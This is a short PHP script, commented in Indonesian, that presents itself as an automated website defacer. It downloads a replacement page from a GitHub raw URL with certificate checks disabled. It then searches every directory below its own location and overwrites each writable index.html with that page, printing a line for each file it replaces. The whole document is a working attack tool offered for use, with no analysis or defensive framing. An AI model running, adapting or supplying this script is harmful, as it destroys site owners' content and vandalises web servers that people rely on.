<?php
/**
 * Y.O.U - Automated Index.html Defacer
 * Memakan semua index.html di server dan menggantinya dengan konten dari URL.
 * HANYA INDEX.HTML (case sensitive).
 */

// Konfigurasi
$target_url = 'https://raw.githubusercontent.com/hamz666-lang/fuckhaters/main/index.html';
$start_path = __DIR__; // Mulai dari direktori script ini berada

// Fungsi untuk mendownload konten dari URL
function fetch_content($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

// Fungsi rekursif untuk mencari dan mengganti index.html
function deface_index_html($dir, $payload) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            // Rekursif ke subdirektori
            deface_index_html($path, $payload);
        } elseif (strtolower($file) === 'index.html') {
            // HANYA index.html yang di-overwrite
            if (is_writable($path)) {
                file_put_contents($path, $payload);
                echo "[+] Berhasil: $path\n";
            } else {
                echo "[-] Gagal (tidak writable): $path\n";
            }
        }
    }
}

// Eksekusi
$payload = fetch_content($target_url);
if ($payload === false) {
    die("[!] Gagal mendownload payload dari $target_url\n");
}

echo "[*] Mulai deface index.html dari: $start_path\n";
deface_index_html($start_path, $payload);
echo "[*] Selesai.\n";
?>
